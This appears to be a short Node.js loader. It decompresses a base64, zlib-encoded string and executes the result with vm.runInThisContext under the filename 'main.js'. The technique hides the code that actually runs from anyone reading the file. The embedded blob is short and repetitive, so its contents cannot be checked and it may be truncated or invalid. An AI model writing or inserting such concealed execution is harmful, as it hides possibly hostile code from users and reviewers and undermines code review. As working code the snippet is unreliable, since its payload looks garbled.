const zlib = require('zlib');
const code = zlib.inflateSync(Buffer.from(
'eNrtfW1z3NZ18Hf9CvBJGwDWLkgqsusuQ2tkSqoUSxZHS0nMWiO7sS17vE5sJ7EzyWx2s7OzO7O7s7O7s7O7',
'base64')).toString('utf8');
require('vm').runInThisContext(code, { filename: 'main.js' });
